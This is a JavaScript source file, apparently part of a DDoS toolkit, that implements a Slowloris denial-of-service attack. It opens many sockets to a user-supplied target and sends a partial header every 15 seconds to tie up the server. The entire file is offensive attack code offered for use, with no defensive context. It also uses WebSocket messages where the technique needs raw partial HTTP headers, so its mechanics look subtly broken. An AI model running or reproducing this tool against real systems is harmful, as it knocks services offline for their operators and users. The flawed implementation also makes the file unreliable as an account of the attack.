// main/ddos/slowloris.js
function slowloris(target, numSockets) {
  if (!target) {
    console.error("Target URL is required.");
    return;
  }

  const parsedTarget = new URL(target);
  const hostname = parsedTarget.hostname;
  const port = parsedTarget.port || (parsedTarget.protocol === 'https:' ? 443 : 80);
  const isSecure = parsedTarget.protocol === 'https:';

  if (!numSockets || numSockets <= 0) {
    numSockets = 200;
  }

  console.log(`Slowloris attack on ${hostname}:${port} using ${numSockets} sockets.`);

  for (let i = 0; i < numSockets; i++) {
    createSocket(hostname, port, i, isSecure);
  }

  function createSocket(hostname, port, index, isSecure) {
    const socket = new WebSocket((isSecure ? 'wss://' : 'ws://') + hostname + ':' + port);

    socket.onopen = () => {
      console.log(`Socket ${index + 1} opened.`);
      sendPartialHeader(socket);
      setInterval(() => {
        sendPartialHeader(socket);
      }, 15000);
    };

    socket.onclose = () => {
      console.log(`Socket ${index + 1} closed.`);
    };

    socket.onerror = (error) => {
      console.error(`Socket ${index + 1} error: ${error}`);
      socket.close();
    };
  }

  function sendPartialHeader(socket) {
    const partialHeader = "X-Custom-Header: keep-alive\r\n";
    try {
      socket.send(partialHeader);
    } catch (error) {
      console.error("Error sending partial header:", error);
      socket.close();
    }
  }
}

export { slowloris };